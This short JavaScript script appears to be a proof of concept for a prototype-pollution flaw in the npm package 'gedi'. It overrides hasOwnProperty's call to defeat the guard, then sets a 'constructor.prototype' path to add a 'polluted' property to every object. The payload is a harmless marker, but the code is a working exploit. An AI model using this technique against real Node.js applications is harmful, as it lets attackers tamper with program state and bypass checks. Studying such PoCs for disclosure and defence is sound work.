Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
const gedi = require('gedi');
gedi().set('[constructor.prototype/polluted]', 'yes');
console.log({}.polluted);